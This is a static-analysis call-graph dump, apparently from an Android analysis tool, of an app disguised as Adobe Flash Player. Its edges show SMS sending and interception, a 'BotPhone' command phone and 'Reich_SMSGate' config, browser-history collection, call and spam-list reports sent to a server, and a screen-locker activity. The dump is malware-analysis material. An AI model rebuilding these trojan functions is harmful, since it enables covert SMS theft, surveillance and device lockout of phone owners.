VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r4.<java.lang.String: int indexOf(java.lang.String)>("start") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r15.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int parseInt(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashY dummyMainMethod_com_adobe_flashplayer___FlashY(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "browser_history.txt", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, $r21, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean contains(java.lang.CharSequence)>("LOCKED") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("MacrosAData_") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r4, "out.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=spamlist&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: void setResultData(java.lang.String)>(null) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void setResultData(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\nDebug: ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.packages.BK: void <init>()>() in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <com.adobe.packages.BK: void <init>()>
STATIC edge: $r21 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("by") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r30 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r20.<java.lang.String: boolean equals(java.lang.Object)>("On") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("sendSMS[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r5.<android.content.Intent: void <init>(java.lang.String)>("android.settings.SETTINGS") in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r25 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.ZLocker: void setContentView(int)>(2130903042) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.adobeCore dummyMainMethod_com_adobe_flashplayer___adobeCore(android.content.Intent)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r24 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.ComponentName startService(android.content.Intent)>($r3) in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: android.content.Intent getIntent()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("keySmsGate[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_SMSGate", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>(java.lang.String)>($r2) in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.AsyncTask: void <init>()>() in <com.adobe.flashplayer_.FlashVirtual: void <init>()> ==> <android.os.AsyncTask: void <init>()>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=calls&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("faceLock") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashY: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void abortBroadcast()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.BroadcastReceiver: void abortBroadcast()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r5.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
CLINIT edge: staticinvoke <java.lang.Integer: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Integer: void <clinit>()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashZ: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
